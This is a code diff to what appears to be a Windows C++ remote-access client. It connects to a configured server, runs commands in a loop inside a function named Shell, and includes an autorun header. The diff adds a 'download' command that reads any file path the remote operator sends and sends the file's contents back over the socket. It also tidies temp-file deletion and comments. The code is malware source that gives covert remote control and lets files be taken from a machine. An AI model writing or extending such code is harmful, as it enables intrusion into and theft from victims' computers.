@@ -11,7 +11,7 @@
 #include <winsock2.h>
 #include <fstream>
 #include <string>
-
+#include <iostream>
 
 #include "Autorun.h"
 #include "Config.h"
@@ -45,6 +45,7 @@ int main() {
 
 	// server configuration start
 	SOCKADDR_IN add = Server();
+	// start kurva
 	Shell(add);
 	return 0;
 }
@@ -57,7 +58,14 @@ int Shell(SOCKADDR_IN addr) {
 	}
 	char buffer[256];
 	while (true) {
-		system("del file.txt");
+		// deliting the temp file for commands
+		std::ifstream tmp_f("file.txt");
+		if (tmp_f.is_open()) {
+			tmp_f.close();
+			system("del file.txt");
+		}
+
+		// clear varibales
 		buf_file = "";
 		loc_buf_file = "";
 		memset(&buffer, 0x0, sizeof(buffer));
@@ -195,10 +203,18 @@ int Shell(SOCKADDR_IN addr) {
 			send(conn, res.c_str(), sizeof(res) * 300, NULL);
 		}
 
+		else if (!strcmp(buffer, "download")) {
+			recv(conn, path, sizeof(path), NULL);
+			std::ifstream d_file(path);
+			std::cout << "path: " << path;
+			if (!d_file.is_open()) send(conn, "exist", 5, NULL);
+			else {
+				std::string file_data = readFile(path);
+				send(conn, file_data.c_str(), file_data.length(), NULL);
+			}
+		}
+
 		else if (strcmp(buffer, "close") == 0) return 1;
 	}
 	return 0;
 }
-
-
-// start kurva
